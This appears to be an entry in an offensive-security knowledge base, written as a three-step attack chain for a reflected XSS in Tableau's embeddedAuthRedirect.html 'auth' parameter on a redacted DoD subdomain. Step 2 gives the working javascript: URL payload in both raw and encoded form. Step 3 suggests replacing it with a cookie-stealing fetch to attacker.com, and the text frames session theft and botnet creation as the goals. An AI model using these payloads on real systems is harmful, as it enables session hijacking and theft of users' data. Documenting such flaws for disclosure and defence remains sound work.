---
id: ac-reflected-xss-tableau-auth-redirect
tags:
  - xss
  - reflected-xss
  - tableau
  - javascript
  - web-vulnerability
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Collection]]'
verified: false
platforms:
  - Web
submitted: true
complexity: low
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Exploit-Reflected-XSS-in-Auth-Parameter]]'
step_count: 3
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:24.799Z'
description: >-
  A multi-step attack exploiting a reflected XSS vulnerability in the 'auth'
  parameter of Tableau's embeddedAuthRedirect.html endpoint on a DoD subdomain,
  allowing arbitrary JavaScript execution in the victim's browser for session
  theft or botnet creation.
skill_level: beginner
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# Reflected XSS in Tableau Authentication Redirect for Client-Side Execution

Multi-stage attack chain demonstrating exploitation of a reflected XSS vulnerability in a U.S. Department of Defense subdomain's Tableau authentication redirect feature, enabling arbitrary JavaScript execution to steal sessions or manipulate the victim's browser.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~1 minutes |
| Skill Level | Beginner |
| Complexity | Low |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Navigate to Subdomain] --> B[Inject Malicious Payload]
    B --> C[Execute and Observe JavaScript]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- Web browser (e.g., Chrome or Firefox)

### Target Environment

- Web platform with Tableau integration
- Publicly accessible DoD subdomain (e.g., https://example.dod.mil)
- No authentication required for initial access

### Initial Access Requirements

- Direct network access to the target subdomain
- No prior credentials needed
- Victim must visit the crafted malicious URL

## Detailed Attack Procedures

### Step 1: Navigate to the Vulnerable Subdomain
procedure: [[procedures/Exploit-Reflected-XSS-in-Auth-Parameter]]

**Objective**: Identify and access the target subdomain hosting the vulnerable Tableau authentication endpoint.

**Instructions**: Open a web browser and navigate to the main subdomain URL, such as https://███ (redacted DoD subdomain). Inspect the page for Tableau-related features or authentication redirects.

**Expected Output**: Successful loading of the subdomain page without errors.

**Success Indicators**:
- Subdomain loads in the browser
- Presence of Tableau integration visible in page source or navigation

### Step 2: Access the Embedded Authentication Redirect Endpoint with Malicious Payload
procedure: [[procedures/Exploit-Reflected-XSS-in-Auth-Parameter]]

**Objective**: Craft and deliver a URL with a javascript: URI scheme payload in the 'auth' parameter to trigger reflected XSS.

**Instructions**: Construct the malicious URL by appending the vulnerable endpoint with the payload. Use either the raw or URL-encoded variant:

Raw: https://███████/en/embeddedAuthRedirect.html?auth=javascript:alert("xElkomy")

URL-encoded: https://███████/en/embeddedAuthRedirect.html?auth=javascript:alert(%22xElkomy%22)

Visit the URL in the browser. The 'auth' parameter reflects the input unsanitized, executing the JavaScript.

**Expected Output**: The browser executes the payload, displaying an alert dialog with 'xElkomy'.

**Success Indicators**:
- Alert dialog pops up confirming execution
- No server-side errors; payload reflects client-side

### Step 3: Observe Execution of Payload
procedure: [[procedures/Exploit-Reflected-XSS-in-Auth-Parameter]]

**Objective**: Verify the XSS vulnerability and assess potential for further exploitation like session theft.

**Instructions**: Upon payload execution, note the alert confirmation. In a real attack, replace the alert with code to exfiltrate cookies (e.g., javascript:fetch('https://attacker.com?cookie='+document.cookie)) or perform other actions.

**Expected Output**: JavaScript runs in the browser context, with potential for data theft or DOM manipulation.

**Success Indicators**:
- Arbitrary code executes without restrictions
- Applicable to Tableau-integrated authentication flows

## Attack Chain Summary

### Key Achievements

1. Confirmed reflected XSS in 'auth' parameter without validation
2. Demonstrated client-side JavaScript execution for potential session hijacking
3. Highlighted risks in Tableau redirect features on sensitive domains

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[JavaScript]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]
- [[Collection]]

---
*Last updated: 2023-10-01T00:00:00Z*
